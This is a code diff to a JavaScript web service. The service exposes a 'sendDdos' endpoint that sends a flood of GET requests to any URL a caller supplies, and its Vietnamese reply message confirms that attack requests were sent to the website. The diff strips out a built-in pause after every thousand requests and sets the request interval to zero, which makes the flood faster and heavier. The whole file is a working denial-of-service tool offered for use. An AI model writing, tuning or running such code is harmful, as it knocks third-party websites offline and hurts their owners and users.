@@ -1,22 +1,17 @@
 import axios from "axios";
+
+const sendRequest = async (url) => {
+  await axios.get(url).catch(() => {});
+};
 function Ddos(link, max) {
-  let count2 = 0;
   let count = 0;
-  let time = 0;
   const inter = setInterval(() => {
     count++;
-    count2 = count2 + 1;
-    time = 0;
-    if(count2 >= 1000) {
-      time = 5000;
-      count2 = 0;
-    }
-    axios.get(link).catch(() => {
-    })
+    sendRequest(link);
     if (count > max) {
       clearInterval(inter);
     }
-  }, time);
+  }, 0);
 }
 function isValidURL(str) {
   const urlPattern =
@@ -39,7 +34,7 @@ export const sendDdos = async (req, res) => {
     });
   }
   res.json({
-    code:200,
-    message: `Đã gửi request tấn công website: ${req.query.link}`
-  })
+    code: 200,
+    message: `Đã gửi request tấn công website: ${req.query.link}`,
+  });
 };
